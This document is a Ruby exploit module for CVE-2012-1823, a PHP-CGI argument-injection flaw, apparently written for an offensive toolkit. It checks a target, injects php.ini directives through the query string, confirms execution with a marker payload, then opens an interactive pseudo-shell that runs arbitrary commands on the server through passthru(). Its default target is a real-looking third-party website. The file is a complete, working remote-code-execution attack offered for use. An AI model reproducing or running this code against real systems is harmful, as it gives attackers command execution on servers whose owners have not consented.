# PHP-CGI Remote Code Execution Exploit => CVE-2012-1823

class PHPcgiRCE < Core::CoreShell
	def initialize
		#Basic Info:
		module_name='PHPcgiRCE'
		module_info={
			'Name'        => 'PHP-CGI RCE Exploit',
			'Version'     => 'v0.01b',
			'Description' => "This is a exploit for CVE-2012-1823, PHP-CGI Remote Code Execution Exploit. A vulnerability in the parsing of PHP-CGI based implementations leads to vulnerability allowing one to remotely inject arguements into the PHP-CGI binary and make changes to php.ini directives, ultimately allowing for remote code execution.\n\n\tTarget => Target Site and Path to Existing PHP Page (http(s)://site.com/index.php)\n\tProxyIp => Proxy IP Address\n\tProxyPort => Proxy Port\n\tUsername/Password => To be used for Proxy Auth if needed",
			'Author'      => 'Unknown, Ruby Version by Hood3dRob1n'
		}

		module_required={ 'Target' => "http://newplayers.whatsonstage.com/test.php" }
		module_optional={ 'ProxyIp' => 'nil', 'ProxyPort' => 'nil', 'Username' => 'nil', 'Password' => 'nil' } 

		@non_set_private_options={ 'Auth' => 'False', 'Cookie' => 'nil' } #Shouldn't Need for this one....

		if $module_name.nil?
			pluginRegistrar(module_name,module_info,module_required,module_optional)
		else
			isitup
		end
	end

	#Check if site is up
	def isitup
		#Initialize our Http::EasyCurb request object with any special values needed, otherwise mark them to nil....
		@http = Http::EasyCurb.new(@non_set_private_options['Cookie'],@non_set_private_options['Auth'],$module_optional['ProxyIp'],$module_optional['ProxyPort'],$module_optional['Username'],$module_optional['Password'])

		rez = @http._get($module_required['Target'])

		#If responds favorably to request to provided forum index.php link then proceed, else bail out with a blaze of gunfire :p
		if rez[1] == 200 or rez[1] == 301 or rez[1] == 302
			puts "[".light_green + "*".white + "] Site appears to be up".light_green + "....".white
			#Check if set-cookie was set, if so grab it for use in a minute...
			if rez[3] =~ /set-cookie: (.+)/i
				ocoo = $1
				ocoo2 = ocoo.split('; ')[0]
			end

			#Find Server Type Using 'Server' Header Field in Server Response if present
			if rez[3] =~ /server: (.+)/i
				orez = $1
			end
			if not orez.nil?
				if orez =~ /IIS/ or orez =~ /Windows/i or orez =~ /Win32/i or orez =~ /Win64/i
					puts "[".light_green + "*".white + "] Windows Server".light_green + ": #{orez}".white
				elsif orez =~ /Apache\/|CentOS|Red Hat|Debian|Fedora|Linux\/SuSE/i
					puts "[".light_green + "*".white + "] Unix Server".light_green + ": #{orez}".white
				else
					puts "[".light_green + "*".white + "] Unknown Server".light_green + ": #{orez}".white
				end
			end
			vuln_check
		else
			puts "[".light_red + "X".white + "] Provided site and path don't seem to be working! Please double check and try again or check manually".light_red + ".......".white
			puts "[".light_red + "X".white + "] ".light_red
		end
	end

	#CHeck if it is vuln
	def vuln_check
		puts "[".light_green + "*".white + "] Attempting to trigger exploit".light_green + "....".white

		@link="#{$module_required['Target']}?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
		@rnd = randz(5)
		payload = "<?echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
		rez = @http._post(@link, payload)
		if rez[0] =~ /:#{@rnd}:(.+):#{@rnd}:/ 
			puts "[".light_green + "*".white + "] Mark Found".light_green + ": #{$1}".white
			phpcgi_shell
		else
			puts "[".light_red + "X".white + "] Doesn't appear to be vulnerable".light_red + "!".white
		end
	end

	#Pseduo Shell to execute commands...
	def phpcgi_shell
		puts "[".light_green + "*".white + "] Dropping to Pseudo Shell".light_green + ".....".white
		puts "[".light_yellow + "*".white + "] Type '".light_yellow + "EXIT".white + "' or '".light_yellow + "QUIT".white + "' to exit & return to Main Menu".light_yellow + ".....".white
		puts
		prompt = "(PHP-CGI Shell)> "
		while line = Readline.readline("#{prompt}", true)
			cmd = line.chomp
			case cmd
				when /^clear|^cls|^banner/i
					cls
					banner
					puts
				when /^exit|^quit/i
					puts "[".light_red + "X".white + "] OK, Exiting Pseudo Shell & returning to Main Menu".light_red + "....".white
					puts "[".light_yellow + "X".white + "] Got r00t".light_yellow + "?".white
					break
				else
					@rnd = randz(5)
					payload = "<?echo \":\".\"#{@rnd}:\"; passthru('#{cmd}');echo \":#{@rnd}:\";?>"
					rez = @http._post(@link, payload)
					if rez[0] =~ /:#{@rnd}:(.+):#{@rnd}:/m
						results=$1
						puts "#{results}".white
					else
						puts "[".light_red + "X".white + "] Nothing Found".light_red + "?".white
puts rez[0]
puts rez
					end
				end
		end
	end
end

PHPcgiRCE.new
